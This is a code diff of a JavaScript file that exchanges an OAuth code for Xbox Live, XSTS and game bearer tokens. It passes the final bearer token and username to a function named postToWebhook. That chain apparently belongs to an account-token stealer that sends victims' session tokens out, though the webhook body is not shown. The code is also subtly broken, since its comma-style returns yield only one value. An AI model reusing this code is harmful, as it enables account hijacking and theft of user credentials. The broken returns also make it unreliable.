@@ -51,7 +51,7 @@ async function getAccessToken(code) {
         grant_type: 'authorization_code'
     }
     let response = await axios.post(url, data, headers)
-    return response.data['access_token']
+    return response.data.access_token
 }
 
 async function getUserHashAndToken(accessToken) {
@@ -70,7 +70,7 @@ async function getUserHashAndToken(accessToken) {
         TokenType: 'JWT'
     }
     let response = await axios.post(url, data, headers)
-    return response.data['uhs'], response.data['DisplayClaims']['xui'][0]['uhs']
+    return response.data.Token, response.data.DisplayClaims.xui[0].uhs
 }
 
 async function getXSTSToken(userToken) {
@@ -88,7 +88,7 @@ async function getXSTSToken(userToken) {
         TokenType: 'JWT'
     }
     let response = await axios.post(url, data, headers)
-    return response.data['Token']
+    return response.data.Token
 }
 
 async function getBearerTokenAndUsername(xstsToken, userHash) {
@@ -101,7 +101,7 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
         ensureLegacyEnabled: true
     }
     let response = await axios.post(url, data, headers)
-    return response.data['access_token'], response.data['username']
+    return response.data.access_token, response.data.username
 }
 
 function postToWebhook(username, bearerToken) {
